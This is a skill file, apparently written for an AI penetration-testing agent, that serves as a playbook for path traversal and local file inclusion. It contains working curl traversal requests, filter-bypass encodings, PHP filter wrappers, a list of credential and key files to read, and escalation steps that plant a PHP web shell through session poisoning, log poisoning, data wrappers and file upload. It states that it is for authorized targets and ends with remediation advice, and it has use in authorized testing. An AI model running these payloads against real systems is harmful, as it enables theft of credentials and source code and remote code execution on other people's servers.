---
name: lfi
description: Path traversal / Local-File-Inclusion playbook — break out of the webroot with ../ sequences, read sensitive files (/etc/passwd, app config, .env, source), bypass filters (encoding, wrappers) and escalate LFI to RCE via PHP wrappers / log poisoning / /proc/self/environ. Use when a parameter loads a file (page=, file=, lang=, template=, include=, download=) or when you can influence an include path.
allowed-tools:
  - http
  - shell
  - read_payloads
  - file_write
---

# Path traversal / LFI playbook

Goal: read a file outside the webroot using only the app's own file-loading parameter, then escalate where possible. Authorized targets only.

## 1. Confirm traversal

```sh
# null-byte-free baseline (modern PHP/nginx don't need %00)
curl -ksS "https://TARGET/page?file=../../../../etc/passwd"
curl -ksS "https://TARGET/page?file=../../../../../../etc/passwd"
curl -ksS "https://TARGET/index.php?page=..%2f..%2f..%2f..%2fetc%2fpasswd"
```

Signs it worked: response contains `root:`, `daemon:`, or a config snippet. If the extension is appended server-side (`file=...&ext=.php`), try:

```sh
curl -ksS "https://TARGET/page?file=../../../../etc/passwd%00"
curl -ksS "https://TARGET/page?file=../../../../etc/passwd."         # trim trick
curl -ksS "https://TARGET/page?file=../../../etc/passwd/."           # path normalization
```

## 2. Filter bypasses

- Encodings: `..%2f`, `%2e%2e%2f`, `%252e%252e%252f` (double URL-encode), mixed case `..%2F`.
- If `../` is stripped once: `....//....//etc/passwd` (strip leaves `../../`).
- If traversal is blocked entirely, try PHP wrappers (LFI → content):
  - `php://filter/convert.base64-encode/resource=index.php` → base64 source read (then decode locally and repeat for other files: config, db creds).
  - `php://filter/resource=../../etc/passwd`.
- `/proc`: `file=/proc/self/environ`, `file=/proc/self/cmdline`, `file=/proc/self/fd/0` — useful when the app is CGI-ish and env carries `HTTP_USER_AGENT` (see log poisoning below).

## 3. Sensitive files to read (adjust to stack)

```
/etc/passwd
/etc/hostname /etc/hosts
/proc/self/environ /proc/self/cmdline /proc/version
app/.env, .env, config.php, wp-config.php, settings.py
web.xml (Java), application.properties, server.xml
/root/.ssh/id_rsa (only if the app runs as root — unlikely; note the weakness if readable)
```

## 4. LFI → RCE escalation

- **PHP session poisoning**: find the session file (`/var/lib/php/sessions/sess_<PHPSESSID>`), plant `<?php system($_GET['c']); ?>` in a session-controlled field (e.g. `PHP_SESSION_UPLOAD_PROGRESS` or a username field), then include the session file.
- **Log poisoning**: `UA` payload `<pre><?php system($_GET['c']) ?></pre>`; include `/var/log/apache2/access.log` or `/proc/self/environ`, then `?c=id`.
- **Wrappers**: `expect://id` (rarely enabled), `data://text/plain,<?php system('id') ?>` (needs `allow_url_include=1`).
- **upload + include**: any file upload endpoint can drop a PHP shell that `file=` then includes.

## 5. Reporting

Evidence: the request URL + payload and the returned file contents (even base64 — decode and attach). Impact: source disclosure, credentials/config leak, possible RCE. Remediation: whitelist file names, disable dangerous wrappers, never let user input drive filesystem paths.

When you have real file contents as evidence, call `confirm_finding`.